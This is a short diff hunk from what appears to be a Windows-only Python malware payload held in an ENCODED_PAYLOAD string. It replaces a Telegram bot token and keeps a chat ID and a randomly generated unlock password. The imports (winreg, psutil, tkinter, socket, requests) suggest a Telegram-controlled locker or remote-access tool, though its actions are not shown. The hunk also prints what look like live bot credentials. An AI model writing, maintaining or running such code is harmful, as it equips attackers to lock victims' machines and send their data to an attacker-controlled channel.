@@ -9,7 +9,7 @@ ENCODED_PAYLOAD = """
 import os, sys, time, shutil, requests, tkinter as tk, psutil, winreg, threading, random, string, socket
 
 if os.name != 'nt': sys.exit(1)
-BOT_TOKEN = "8644292894:AAHprQKa9xO39SB9t9eSZWq9LuxWk_Ta548"
+BOT_TOKEN = "8320512407:AAF8XKfXkVYUTP7x_FHHMo1oAK_CkFr95VM"
 CHAT_ID = "8573437923"
 PASSWORD = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
 
